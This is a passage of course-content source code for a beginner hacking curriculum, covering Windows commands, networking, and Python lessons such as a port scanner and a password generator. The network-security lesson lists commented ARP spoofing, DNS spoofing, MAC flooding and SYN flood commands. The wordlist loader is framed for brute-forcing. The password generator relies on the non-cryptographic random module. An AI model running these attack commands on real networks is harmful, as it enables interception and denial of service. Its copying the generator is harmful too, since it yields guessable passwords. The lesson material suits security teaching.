set MYVAR=value
echo %MYVAR%
\`\`\`

**WMIC — Windows Management Instrumentation (powerful querying):**
\`\`\`cmd
# WMI is being deprecated but still works on most systems

# Get OS info
wmic os get Caption,Version,OSArchitecture

# Get CPU info
wmic cpu get Name,NumberOfCores,MaxClockSpeed

# Get disk info
wmic diskdrive get Model,Size

# Get running processes
wmic process get Name,ProcessId,ExecutablePath

# Get installed hotfixes (patches)
wmic qfe get HotFixID,InstalledOn

# Get BIOS info
wmic bios get SerialNumber,Manufacturer
\`\`\`

**Practical progression:**
\`\`\`cmd
# 1. Check your Windows version
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName

# 2. View auto-start programs
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# 3. Get system information
wmic os get Caption,Version,OSArchitecture
wmic cpu get Name,NumberOfCores

# 4. Check environment
echo %USERPROFILE%
echo %TEMP%
\`\`\``),
  ],

  'networking-101': [
    l('net-1', 'What is a Network?',
      `A **network** is two or more computers connected together to share data. The **internet** is just a massive network of networks.

Every device on a network has an **IP address** — like a street address for your computer. IP addresses look like this:

\`\`\`
192.168.1.42
\`\`\`

There are two types:
- **Public IP** — your address on the internet (unique worldwide)
- **Private IP** — your address on your local network (e.g., 192.168.x.x)

A **port** is like a door on a computer. Each service listens on a specific port:
- Port 80 → HTTP (websites)
- Port 443 → HTTPS (secure websites)
- Port 22 → SSH (remote login)
- Port 53 → DNS (domain resolution)

\`\`\`bash
# See your own IP address on Linux/Mac
ip addr show

# See your public IP (requires internet)
curl ifconfig.me
\`\`\``),

    l('net-2', 'The OSI Model',
      `The **OSI model** breaks network communication into 7 layers. Think of it like sending a package:

1. **Physical** — the actual cables and radio waves
2. **Data Link** — MAC addresses, switches (Ethernet, Wi-Fi)
3. **Network** — IP addresses, routing (your internet router works here)
4. **Transport** — TCP/UDP ports (ensures data arrives correctly)
5. **Session** — manages connections between apps
6. **Presentation** — translates data formats (encryption, compression)
7. **Application** — what you interact with (HTTP, DNS, SSH)

The practical layers you need to remember:
- **Layer 3 (Network)** — IP addresses and routing
- **Layer 4 (Transport)** — TCP/UDP and ports
- **Layer 7 (Application)** — the protocols you use daily

When someone says "layer 7 attack," they mean attacking the application level (like HTTP), not the network level.`),

    l('net-3', 'TCP/IP & UDP',
      `**TCP** and **UDP** are the two main transport protocols. They sit on top of IP.

**TCP (Transmission Control Protocol)** is reliable. It establishes a connection (called a "three-way handshake") before sending data and retransmits lost packets.

\`\`\`
1. SYN  → "Hey, can we talk?"
2. SYN-ACK → "Sure, I'm listening."
3. ACK  → "Great, let's talk."
        → Data flows...
4. FIN  → "Goodbye."
\`\`\`

TCP is used for: web (HTTP), email (SMTP), SSH, file transfers (FTP).

**UDP (User Datagram Protocol)** is fast but unreliable. It sends data without checking if it arrived. Like shouting across a room — you hope they heard you.

UDP is used for: video streaming, DNS queries, VoIP, online gaming.

\`\`\`bash
# Check which ports are listening on your machine
netstat -tlnp   # TCP ports
netstat -ulnp   # UDP ports
\`\`\`

The \`-t\` flag filters TCP, \`-u\` for UDP, \`-l\` for listening, \`-n\` for numeric addresses, \`-p\` shows the program.`),

    l('net-4', 'DNS Explained',
      `**DNS (Domain Name System)** translates human-readable domain names into IP addresses. When you type \`google.com\`, DNS finds the IP address so your computer knows where to connect.

Think of it as the phonebook of the internet.

\`\`\`bash
# Find the IP address of a domain
nslookup google.com

# Or use dig (more detailed)
dig google.com

# Short output
dig google.com +short
\`\`\`

\`\`\`
nslookup google.com
Server:  192.168.1.1
Address: 192.168.1.1#53

Non-authoritative answer:
Name:    google.com
Address: 142.250.80.46
\`\`\`

DNS uses UDP on port 53. The query goes to your configured DNS server (usually your router or an ISP), which finds the answer by asking other DNS servers.

**Common DNS records:**
- **A** — maps domain to IPv4 address
- **AAAA** — maps domain to IPv6 address
- **MX** — mail server for the domain
- **CNAME** — alias from one domain to another

\`\`\`bash
# Check mail servers
nslookup -type=MX gmail.com

# Check all record types
dig any google.com
\`\`\``),

    l('net-5', 'HTTP & HTTPS',
      `**HTTP** is the protocol your browser uses to talk to websites. It's a request-response protocol.

A typical HTTP request looks like:

\`\`\`http
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
\`\`\`

The server responds:

\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

<html>...
\`\`\`

**HTTP Methods:**
- **GET** — retrieve data (most common)
- **POST** — send data (forms, login)
- **PUT** — update data
- **DELETE** — remove data

**Status Codes:**
- **200** — OK (success)
- **301/302** — Redirect
- **401** — Unauthorized
- **403** — Forbidden
- **404** — Not Found
- **500** — Server Error

**HTTPS** is HTTP over SSL/TLS. It encrypts the entire conversation so nobody in the middle can read it.

\`\`\`bash
# See HTTP headers with curl
curl -I https://example.com

# See full response
curl -v https://example.com
\`\`\``),

    l('net-6', 'Troubleshooting Tools',
      `The best way to learn networking is by doing. Here are the essential troubleshooting tools.

\`\`\`bash
# ping — check if a host is reachable
ping -c 4 google.com
\`\`\`

\`\`\`
PING google.com (142.250.80.46) 56(84) bytes of data.
64 bytes from 142.250.80.46: icmp_seq=1 ttl=118 time=12.3 ms
64 bytes from 142.250.80.46: icmp_seq=2 ttl=118 time=11.8 ms
\`\`\`

The \`time\` shows latency in milliseconds. Lower is faster.

\`\`\`bash
# traceroute — see every hop to a destination
traceroute google.com
\`\`\`

Each line is a router your packets pass through. If it stops at a certain hop, that's where the problem is.

\`\`\`bash
# curl — the Swiss Army knife of HTTP
curl https://api.github.com/users/octocat
curl -o page.html https://example.com    # save to file
curl -X POST -d "user=admin&pass=test" https://example.com/login
\`\`\`

\`\`\`bash
# nmap (if installed) — scan a host for open ports
nmap -p 22,80,443 scanme.nmap.org
\`\`\`

Practice on \`scanme.nmap.org\` (a legal test target provided by the Nmap project).`, { hasQuiz: true, quiz: [
        { id: 'net-6-q1', question: 'What does the `-c` flag do in the ping command?', options: ['Set packet size', 'Specify count of pings', 'Set timeout', 'Enable flood mode'], correctIndex: 1, explanation: 'ping -c N sends N packets and stops. Without -c, ping runs forever on Linux.' },
        { id: 'net-6-q2', question: 'What command shows the route packets take to a destination?', options: ['ping', 'traceroute', 'netstat', 'curl'], correctIndex: 1, explanation: 'traceroute shows every hop (router) between you and the destination.' },
        { id: 'net-6-q3', question: 'How do you see only response headers with curl?', options: ['curl -v', 'curl -I', 'curl -O', 'curl -L'], correctIndex: 1, explanation: 'curl -I sends a HEAD request and shows only the response headers, useful for fingerprinting.' },
      ] }),

    l('net-7', 'Subnetting & CIDR',
      `Subnetting divides a network into smaller pieces. Understanding it helps you scan efficiently and understand network architecture.

**IP addresses and subnet masks:**
\`\`\`
IP:     192.168.1.0
Mask:   255.255.255.0   (/24 in CIDR notation)
        ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
Network portion  |  Host portion

/24 = 255.255.255.0 = 256 addresses (254 usable)
\`\`\`

**CIDR notation — from /0 to /32:**
\`\`\`bash
# Common CIDR ranges
# /8   = 255.0.0.0       = 16,777,214 hosts
# /16  = 255.255.0.0     = 65,534 hosts
# /24  = 255.255.255.0   = 254 hosts
# /25  = 255.255.255.128 = 126 hosts
# /26  = 255.255.255.192 = 62 hosts
# /27  = 255.255.255.224 = 30 hosts
# /28  = 255.255.255.240 = 14 hosts
# /29  = 255.255.255.248 = 6 hosts
# /30  = 255.255.255.252 = 2 hosts (point-to-point link)

# Calculate: 2^(32-CIDR) - 2 = usable hosts
# /24: 2^(32-24) - 2 = 2^8 - 2 = 254
# /28: 2^(32-28) - 2 = 2^4 - 2 = 14
\`\`\`

**Subnetting in practice:**
\`\`\`bash
# Example: 192.168.1.0/24 split into 4 subnets
# Subnet A: 192.168.1.0/26   (192.168.1.1 - 192.168.1.62)
# Subnet B: 192.168.1.64/26  (192.168.1.65 - 192.168.1.126)
# Subnet C: 192.168.1.128/26 (192.168.1.129 - 192.168.1.190)
# Subnet D: 192.168.1.192/26 (192.168.1.193 - 192.168.1.254)
\`\`\`

**Network address vs broadcast address:**
\`\`\`
Network:   192.168.1.0    (first address — not assignable)
Usable:    192.168.1.1 - 192.168.1.254
Broadcast: 192.168.1.255  (last address — not assignable)
\`\`\`

**Quick subnet calculations with tools:**
\`\`\`bash
# Using ipcalc or sipcalc
ipcalc 192.168.1.0/24

# Output:
# Address:   192.168.1.0
# Netmask:   255.255.255.0 = 24
# Wildcard:  0.0.0.255
# Network:   192.168.1.0/24
# HostMin:   192.168.1.1
# HostMax:   192.168.1.254
# Broadcast: 192.168.1.255
# Hosts/Net: 254

# Scan a specific subnet
nmap -sn 192.168.1.0/24
\`\`\`

**Private IP ranges (RFC 1918):**
\`\`\`
10.0.0.0/8      — Large internal networks
172.16.0.0/12   — AWS default VPC
192.168.0.0/16  — Home/Small office
\`\`\`

**Quick mental shortcuts:**
\`\`\`
/24 = 256 addresses (last octet = 0-255)
/25 = 128 addresses (last octet split: 0-127, 128-255)
/26 = 64 addresses  (4 subnets)
/27 = 32 addresses  (8 subnets)
/28 = 16 addresses  (16 subnets)
\`\`\``),

    l('net-8', 'DHCP & NAT',
      `DHCP assigns IP addresses automatically. NAT allows many devices to share one public IP.

**DHCP — Dynamic Host Configuration Protocol:**
\`\`\`bash
# The DORA process:
# Discover — "Anyone out there? I need an IP!"
# Offer    — "Use 192.168.1.42" (from DHCP server)
# Request  — "I'll take 192.168.1.42"
# Ack      — "Confirmed, you have it for 24 hours"

# See your DHCP lease info (Linux)
cat /var/lib/dhcp/dhclient.leases

# Force a new DHCP lease
sudo dhclient -r    # Release current lease
sudo dhclient       # Request new lease

# See DHCP server info (from your router)
ip route | grep default
# The gateway is typically your DHCP server
\`\`\`

**Check DHCP info on different OS:**
\`\`\`bash
# Linux: check DHCP-assigned IP
ip addr show
ip route show

# Windows equivalent:
# ipconfig /all    (shows DHCP server, lease time)
# ipconfig /renew  (request new lease)
\`\`\`

**NAT — Network Address Translation:**
\`\`\`bash
# NAT types (important for penetration testing):
# Full Cone NAT    — Any external host can reach you
# Restricted Cone  — Only hosts you contacted can reach you
# Port Restricted  — Only hosts+ports you contacted
# Symmetric NAT    — Each connection gets a different mapping

# See your public IP (what the internet sees)
curl -s ifconfig.me
curl -s icanhazip.com

# See your private IP
hostname -I   # Linux
# ipconfig     # Windows
\`\`\`

**Check NAT and connection tracking:**
\`\`\`bash
# Linux: see NAT table (iptables)
sudo iptables -t nat -L -n

# See connection tracking table
sudo conntrack -L | head -20

# Common ports and their NAT behavior:
# HTTP (80)  — typically NAT-friendly
# DNS (53)   — UDP, works through NAT
# FTP (21)   — problematic with NAT (needs passive mode)
# SIP (5060) — often broken by NAT
\`\`\`

**Port forwarding through NAT:**
\`\`\`bash
# To make a local service accessible from the internet:
# 1. Set a static internal IP for your machine
# 2. On your router, forward external port → internal IP:port
# Example: Forward port 8080 → 192.168.1.10:80 (web server)

# Test if a port is reachable from outside
# (run this from a machine OUTSIDE your network)
nmap -p 8080 <your-public-ip>
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Check your private and public IP
hostname -I
curl -s ifconfig.me

# 2. Check your default gateway and DHCP server
ip route | grep default
cat /var/lib/dhcp/dhclient.leases 2>/dev/null | tail -10

# 3. Release and renew your IP
sudo dhclient -v -r
sudo dhclient -v
\`\`\``),

    l('net-9', 'Network Security Basics',
      `Understanding firewalls, VPNs, and security concepts is essential for both offense and defense.

**Firewalls — what they block and allow:**
\`\`\`bash
# Check if a firewall is active (Linux)
sudo ufw status
sudo iptables -L -n -v

# Common firewall rules:
# Default: DROP (deny all, allow specific)
# Default: ACCEPT (allow all, deny specific)

# Test if a port is filtered by a firewall
nmap -p 22 scanme.nmap.org
# "filtered" = firewall is blocking

# Common firewall behaviors:
# DROP    — packet disappears (no response) - stealth
# REJECT  — packet returns "connection refused"
# LOG     — packet is logged but allowed/blocked
\`\`\`

**VPN — Virtual Private Network:**
\`\`\`bash
# VPNs create an encrypted tunnel between two points
# Types:
# OpenVPN    — open source, most flexible
# WireGuard  — newer, faster, simpler
# IPsec      — older standard, built into many OS
# PPTP       — old, broken, never use

# Check if a VPN is active
ip addr show tun0   # OpenVPN creates tun0
ip addr show wg0    # WireGuard creates wg0

# Your public IP should change when VPN is active
curl -s ifconfig.me
# (Compare with and without VPN)
\`\`\`

**TLS/SSL — encryption for the web:**
\`\`\`bash
# Check if a site uses valid TLS
curl -v https://example.com 2>&1 | grep "SSL connection"

# Check certificate details
openssl s_client -connect example.com:443 < /dev/null 2>/dev/null | openssl x509 -text | head -20

# Check supported TLS versions
nmap --script ssl-enum-ciphers -p 443 example.com
\`\`\`

**Common network attacks (know your adversary):**
\`\`\`bash
# ARP spoofing — intercept traffic on local network
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# DNS spoofing — redirect traffic to fake sites
# dnsspoof -i eth0 -f hosts.txt

# MAC flooding — overflow switch memory
# macof -i eth0

# SYN flood — denial of service
# hping3 -S --flood -V <target>
\`\`\`

**Quick security checks:**
\`\`\`bash
# Check listening ports (what's exposed?)
ss -tulnp

# Check who's connected to your machine
ss -atnp | grep ESTAB

# Check DNS settings (are you being redirected?)
cat /etc/resolv.conf
dig +short google.com

# Check ARP table (any suspicious entries?)
ip neighbor show
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Check what ports are listening on your machine
ss -tulnp

# 2. Check your public IP
curl -s ifconfig.me

# 3. Check a site's TLS certificate
openssl s_client -connect example.com:443 < /dev/null 2>/dev/null | openssl x509 -text | grep "Subject:"

# 4. Scan for vulnerabilities in a router
nmap -sV --script vuln 192.168.1.1
\`\`\``),
  ],

  'python-for-hackers-101': [
    l('py-1', 'Your First Python Script',
      `Python is the most popular language for security tools. It's readable and powerful.

Print to the screen:

\`\`\`python
print("Hello, Hacker!")
\`\`\`

Save this as \`hello.py\` and run: \`python3 hello.py\`

**Variables** store data:

\`\`\`python
name = "Alice"
target_ip = "192.168.1.1"
port = 8080
is_vulnerable = True

print(f"Scanning {target_ip} on port {port}")
\`\`\`

The \`f\` before the string makes it an **f-string** — you can embed variables inside \`{}\`.

**Comments** explain your code:

\`\`\`python
# This is a comment
# Everything after # is ignored by Python

"""
Multi-line comments
use triple quotes
"""
\`\`\`

Comments won't affect execution but help others (and your future self) understand your code.`,
      { hasCodePlayground: true, codePlaygroundInitial: 'print("Hello, Hacker!")\n\nname = "target"\nprint(f"Scanning {name}")', codePlaygroundLanguage: 'python', codePlaygroundExpectedOutput: 'Hello, Hacker!\nScanning target' }),

    l('py-2', 'Strings & Data Types',
      `Python has several built-in data types. Understanding them is crucial.

\`\`\`python
# Strings — text
name = "target.com"
domain = 'example.com'
combined = name + "/" + domain   # "target.com/example.com"

# Numbers
port = 80              # integer
timeout = 1.5          # float (decimal)

# Boolean
is_alive = True
has_scan = False

# Type conversion
port_str = str(80)     # "80"
port_int = int("80")   # 80
\`\`\`

**String operations** are useful for parsing data:

\`\`\`python
url = "https://target.com/login"
print(url.upper())        # "HTTPS://TARGET.COM/LOGIN"
print(url.split("/"))     # ['https:', '', 'target.com', 'login']
print(url.startswith("https"))  # True
print(url.replace("login", "admin"))  # "https://target.com/admin"

# Slicing — extract parts of a string
print(url[0:5])           # "https"
print(url[-5:])           # "login"
\`\`\`

\`f-strings\` make formatting easy:

\`\`\`python
host = "192.168.1.1"
port = 443
print(f"Connecting to {host}:{port}")
# "Connecting to 192.168.1.1:443"
\`\`\``),

    l('py-3', 'Lists & Dictionaries',
      `**Lists** hold ordered collections of items:

\`\`\`python
ports = [22, 80, 443, 8080]
print(ports[0])      # 22 (first item, index starts at 0)
print(ports[-1])     # 8080 (last item)

ports.append(3306)   # add to end
ports.remove(80)     # remove a value
print(len(ports))    # number of items

# Loop through a list
for port in ports:
    print(f"Checking port {port}")
\`\`\`

**Dictionaries** store key-value pairs (like a phonebook):

\`\`\`python
target = {
    "ip": "10.0.0.1",
    "hostname": "server01",
    "ports": [22, 80, 443],
    "os": "Linux"
}

print(target["ip"])        # "10.0.0.1"
print(target.get("os"))    # "Linux" (safe access)

# Loop through dictionary
for key, value in target.items():
    print(f"{key}: {value}")
\`\`\`

**Lists of dictionaries** are common in security tools:

\`\`\`python
scan_results = [
    {"port": 22,  "state": "open",  "service": "SSH"},
    {"port": 80,  "state": "open",  "service": "HTTP"},
    {"port": 443, "state": "filtered", "service": "HTTPS"},
]

for result in scan_results:
    if result["state"] == "open":
        print(f"Port {result['port']} is OPEN — {result['service']}")
\`\`\``),

    l('py-4', 'Conditionals & Loops',
      `**Conditionals** let your code make decisions:

\`\`\`python
port = 80

if port == 22:
    print("SSH service")
elif port == 80:
    print("HTTP service")
elif port == 443:
    print("HTTPS service")
else:
    print(f"Unknown port: {port}")
\`\`\`

Comparison operators: \`==\` (equal), \`!=\` (not equal), \`>\`, \`<\`, \`>=\`, \`<=\`

\`\`\`python
if port > 0 and port < 1024:
    print("Privileged port")

if port == 80 or port == 443:
    print("Web port")
\`\`\`

**Loops** repeat actions:

\`\`\`python
# For loop — iterate over a range
for i in range(1, 5):
    print(f"Attempt {i}")

# While loop — repeat until condition is false
count = 0
while count < 3:
    print(f"Scanning... attempt {count + 1}")
    count += 1

# Break — exit loop early
for port in range(1, 1024):
    if port == 80:
        print("Found HTTP port!")
        break

# Continue — skip to next iteration
for port in range(1, 10):
    if port == 5:
        continue   # skip port 5
    print(f"Checking port {port}")
\`\`\``),

    l('py-5', 'Functions & Modules',
      `**Functions** group code into reusable blocks:

\`\`\`python
def scan_port(host, port):
    """Check if a port is open on a host."""
    print(f"Scanning {host}:{port}")
    # Function body goes here
    return True

# Call the function
result = scan_port("192.168.1.1", 80)
print(f"Port 80 is open: {result}")
\`\`\`

Functions keep your code organized. The \`def\` keyword defines a function, and \`return\` sends back a value.

**Modules** are Python files you can import:

\`\`\`python
import os
import sys
import json

print(os.name)              # Operating system name
print(sys.version)          # Python version

# Parse JSON
data = '{"host": "test.com", "port": 80}'
parsed = json.loads(data)
print(parsed["host"])
\`\`\`

The **requests** library is essential for HTTP:

\`\`\`bash
# Install it first
pip install requests
\`\`\`

\`\`\`python
import requests

response = requests.get("https://httpbin.org/json")
print(response.status_code)      # 200
print(response.json())           # parsed JSON data
print(response.headers)          # response headers

# POST request
data = {"username": "admin", "password": "test"}
r = requests.post("https://httpbin.org/post", data=data)
print(r.text)
\`\`\``),

    l('py-6', 'Building a Port Scanner',
      `Let's build a real port scanner using Python's \`socket\` library.

\`\`\`python
import socket

def scan_port(host, port):
    """Try to connect to a port. Return True if open."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    return result == 0

# Test a single port
host = "scanme.nmap.org"
if scan_port(host, 80):
    print(f"{host}:80 is OPEN")
else:
    print(f"{host}:80 is CLOSED")
\`\`\`

\`connect_ex\` returns 0 if the connection succeeded (port is open), or an error code if it failed.

Now scan multiple ports:

\`\`\`python
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                993, 995, 1433, 1521, 3306, 3389, 5432, 8080, 8443]

host = "scanme.nmap.org"
print(f"Scanning {host}...")

for port in common_ports:
    if scan_port(host, port):
        print(f"  [+] {host}:{port} is OPEN")
\`\`\`

This is exactly how real port scanners work — they attempt TCP connections on each port and report which ones succeed. Try running this against \`scanme.nmap.org\` (a legal test target).

To speed things up, you can use threading:

\`\`\`python
from concurrent.futures import ThreadPoolExecutor

host = "scanme.nmap.org"
ports = range(1, 1024)

with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(lambda p: (p, scan_port(host, p)), ports)
    for port, is_open in results:
        if is_open:
            print(f"  [+] {port} is OPEN")
\`\`\`

Threading lets you scan many ports simultaneously, making the process much faster.`,

      { hasQuiz: true, quiz: [
        { id: 'py-6-q1', question: 'What does socket.connect_ex() return if a port is open?', options: ['True', '1', '0', 'None'], correctIndex: 2, explanation: 'connect_ex() returns 0 on success (port open) and an error code on failure.' },
        { id: 'py-6-q2', question: 'What library is used for threading in Python?', options: ['threading', 'multiprocessing', 'concurrent.futures', 'asyncio'], correctIndex: 2, explanation: 'concurrent.futures.ThreadPoolExecutor provides a high-level interface for threading.' },
        { id: 'py-6-q3', question: 'Why use threading in a port scanner?', options: ['To bypass firewalls', 'To scan multiple ports simultaneously', 'To avoid detection', 'To reduce network traffic'], correctIndex: 1, explanation: 'Threading allows scanning many ports at once, dramatically speeding up the process.' },
      ] }),

    l('py-7', 'File I/O & Error Handling',
      `Reading and writing files is essential for saving scan results, reading wordlists, and logging output. Error handling prevents your scripts from crashing.

**Reading files — start simple:**
\`\`\`python
# Read entire file
with open("targets.txt", "r") as f:
    content = f.read()
    print(content)

# Read line by line (memory efficient for large files)
with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        print(line.strip())  # .strip() removes \\n
        break  # Just show first line
\`\`\`

**Writing files:**
\`\`\`python
# Write to a file (overwrites!)
with open("results.txt", "w") as f:
    f.write("Scan started at: ...\\n")
    f.write("Port 80: open\\n")

# Append to a file
with open("results.txt", "a") as f:
    f.write("Port 443: open\\n")

# Write multiple lines from a list
ports = [22, 80, 443, 8080]
with open("open_ports.txt", "w") as f:
    for port in ports:
        f.write(f"{port}\\n")
\`\`\`

**Error handling with try/except:**
\`\`\`python
# Basic error handling
try:
    with open("config.txt", "r") as f:
        data = f.read()
except FileNotFoundError:
    print("[-] Config file not found!")
except PermissionError:
    print("[-] Permission denied!")
except Exception as e:
    print(f"[-] Unexpected error: {e}")
\`\`\`

**Handle network errors gracefully:**
\`\`\`python
import socket
import sys

def scan_port(host, port):
    """Safe port scan with error handling."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except socket.gaierror:
        print(f"[-] Hostname resolution failed: {host}")
        return False
    except socket.timeout:
        print(f"[-] Connection timed out: {host}:{port}")
        return False
    except Exception as e:
        print(f"[-] Error scanning {host}:{port}: {e}")
        return False
\`\`\`

**Read a wordlist for brute-forcing:**
\`\`\`python
def load_wordlist(path):
    """Load a wordlist file, return list of words."""
    try:
        with open(path, "r", encoding="latin-1", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {path}")
        return []

# Usage
passwords = load_wordlist("/usr/share/wordlists/rockyou.txt")
print(f"[+] Loaded {len(passwords)} passwords")
\`\`\`

**Practical build-up — a log parser:**
\`\`\`python
# Start simple, then add features
def parse_auth_log(log_path):
    """Parse SSH auth log for failed/successful logins."""
    failed = 0
    success = 0
    
    try:
        with open(log_path, "r") as f:
            for line in f:
                if "Failed password" in line:
                    failed += 1
                elif "Accepted password" in line:
                    success += 1
    except FileNotFoundError:
        print(f"[-] Log file not found: {log_path}")
        return
    
    print(f"[+] Failed logins: {failed}")
    print(f"[+] Successful logins: {success}")
    print(f"[+] Total attempts: {failed + success}")

parse_auth_log("/var/log/auth.log")
\`\`\`

Always handle file and network errors — your scripts will run unattended and WILL encounter edge cases.`),

    l('py-8', 'Web Scraping & HTTP Requests',
      `The \`requests\` library makes HTTP simple. Combined with parsing tools, you can extract data from websites and APIs.

**Basic HTTP requests (build up):**
\`\`\`python
import requests

# Simple GET
r = requests.get("https://httpbin.org/get")
print(r.status_code)     # 200
print(r.text[:200])      # First 200 chars

# With parameters
params = {"q": "sql injection", "page": 1}
r = requests.get("https://httpbin.org/get", params=params)
print(r.url)  # Shows the full URL with parameters
\`\`\`

**Work with response data:**
\`\`\`python
import requests

r = requests.get("https://httpbin.org/json")

# Check response type
print(r.headers["Content-Type"])   # application/json

# Parse JSON
data = r.json()
print(data.keys())                 # Top-level keys

# Save response to file
with open("response.json", "w") as f:
    f.write(r.text)
\`\`\`

**POST requests with data:**
\`\`\`python
import requests

# Form data (like a browser form submission)
data = {"username": "admin", "password": "test123"}
r = requests.post("https://httpbin.org/post", data=data)
print(r.text)

# JSON data (like an API call)
json_data = {"username": "admin", "password": "test123"}
r = requests.post("https://httpbin.org/post", json=json_data)

# With custom headers
headers = {"User-Agent": "Mozilla/5.0", "X-Custom": "test"}
r = requests.get("https://httpbin.org/headers", headers=headers)
\`\`\`

**Handle sessions and cookies:**
\`\`\`python
import requests

# Session object persists cookies across requests
s = requests.Session()

# Log in (cookies are saved in the session)
login_data = {"username": "admin", "password": "secret"}
s.post("https://httpbin.org/post", data=login_data)

# Subsequent requests use the saved cookies
r = s.get("https://httpbin.org/cookies")
print(r.text)
\`\`\`

**Web scraping with BeautifulSoup:**
\`\`\`bash
# Install first
pip install beautifulsoup4 lxml
\`\`\`

\`\`\`python
import requests
from bs4 import BeautifulSoup

# Fetch a page
r = requests.get("https://httpbin.org/html")
soup = BeautifulSoup(r.text, "html.parser")

# Find elements
title = soup.title.text
print(f"Page title: {title}")

# Find all links
for link in soup.find_all("a"):
    href = link.get("href")
    text = link.text.strip()
    print(f"{text} -> {href}")

# Find by class or id
# soup.find_all(class_="content")
# soup.find(id="main-content")

# Extract all text
text = soup.get_text()
\`\`\`

**Practical build-up — a simple recon tool:**
\`\`\`python
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def enumerate_links(url):
    """Extract all links from a page."""
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        links = set()
        for a in soup.find_all("a", href=True):
            full_url = urljoin(url, a["href"])
            links.add(full_url)
        return sorted(links)
    except Exception as e:
        print(f"[-] Error: {e}")
        return []

# Test it
links = enumerate_links("https://httpbin.org")
for link in links[:10]:  # First 10
    print(link)
\`\`\`

Always set a User-Agent and timeout. Many sites block scripts without a proper User-Agent.`),

    l('py-9', 'Working with APIs & JSON',
      `Most modern services use REST APIs with JSON. Understanding how to parse and manipulate JSON is essential.

**JSON structure and Python equivalents:**
\`\`\`python
import json

# JSON string → Python dictionary
json_string = '{"name": "admin", "role": "user", "id": 1001}'
data = json.loads(json_string)
print(data["name"])     # admin
print(data["role"])     # user

# Python dictionary → JSON string
user = {
    "name": "admin",
    "role": "admin",
    "id": 1001,
    "permissions": ["read", "write", "delete"]
}
json_output = json.dumps(user, indent=2)
print(json_output)
\`\`\`

**Working with complex API responses:**
\`\`\`python
import requests
import json

# Fetch API data
r = requests.get("https://api.github.com/users/octocat/repos")
repos = r.json()

# repos is a list of dictionaries
print(f"Found {len(repos)} repositories\\n")

for repo in repos:
    print(f"Name: {repo['name']}")
    print(f"  Stars: {repo['stargazers_count']}")
    print(f"  Language: {repo.get('language', 'N/A')}")
    print(f"  URL: {repo['html_url']}\\n")
\`\`\`

**Error handling for API calls:**
\`\`\`python
import requests
import time

def call_api(url, retries=3):
    """Call an API with retry logic."""
    for attempt in range(retries):
        try:
            r = requests.get(url, timeout=5)
            r.raise_for_status()  # Raise error for 4xx/5xx
            return r.json()
        except requests.exceptions.HTTPError as e:
            if r.status_code == 429:  # Rate limited
                wait = int(r.headers.get("Retry-After", 10))
                print(f"[-] Rate limited, waiting {wait}s")
                time.sleep(wait)
            else:
                print(f"[-] HTTP Error: {e}")
                return None
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed (attempt {attempt+1}/{retries})")
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    return None

data = call_api("https://api.github.com/users/octocat")
if data:
    print(f"User: {data['login']} - Repos: {data['public_repos']}")
\`\`\`

**Build an API enumeration tool:**
\`\`\`python
import requests

def enumerate_api(base_url, endpoints):
    """Check if common API endpoints exist on a target."""
    results = []
    for endpoint in endpoints:
        url = f"{base_url}/{endpoint}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                results.append((url, r.status_code, "FOUND"))
            elif r.status_code == 403:
                results.append((url, r.status_code, "FORBIDDEN"))
            elif r.status_code == 401:
                results.append((url, r.status_code, "UNAUTHORIZED"))
        except:
            pass
    return results

# Common API endpoints to check
endpoints = [
    "api/users", "api/admin", "api/config",
    "api/v1", "api/v2", "swagger.json",
    "api-docs", "graphql", "api/health"
]

results = enumerate_api("https://httpbin.org", endpoints)
for url, status, note in results:
    print(f"[{status}] {url} ({note})")
\`\`\`

APIs are everywhere in modern web applications. Mastering them gives you access to the backend logic of almost any service.`),

    l('py-10', 'Building a Password Generator',
      `Let's build a complete tool from scratch. Start small, add features step by step.

**Step 1: Generate random passwords:**
\`\`\`python
import random
import string

def generate_password(length=12):
    """Generate a random password."""
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(chars) for _ in range(length))
    return password

print(generate_password())
print(generate_password(16))
print(generate_password(8))
\`\`\`

**Step 2: Add customization:**
\`\`\`python
import random
import string

def generate_password(length=12, use_symbols=True, use_numbers=True):
    """Generate a customizable password."""
    chars = string.ascii_letters
    if use_numbers:
        chars += string.digits
    if use_symbols:
        chars += string.punctuation
    
    password = ''.join(random.choice(chars) for _ in range(length))
    return password

# Test different options
print(generate_password())                    # Default
print(generate_password(16, True, True))       # Long, full
print(generate_password(8, False, True))       # Letters + numbers only
print(generate_password(20, True, False))      # Long, letters + symbols
\`\`\`

**Step 3: Ensure at least one of each type:**
\`\`\`python
import random
import string

def generate_password(length=12, use_symbols=True, use_numbers=True):
    """Generate password with guaranteed character types."""
    if length < 4:
        raise ValueError("Password length must be at least 4")
    
    # Guarantee at least one of each selected type
    password = []
    password.append(random.choice(string.ascii_lowercase))
    password.append(random.choice(string.ascii_uppercase))
    
    if use_numbers:
        password.append(random.choice(string.digits))
    if use_symbols:
        password.append(random.choice(string.punctuation))
    
    # Fill the rest randomly
    chars = string.ascii_letters
    if use_numbers:
        chars += string.digits
    if use_symbols:
        chars += string.punctuation
    
    for _ in range(length - len(password)):
        password.append(random.choice(chars))
    
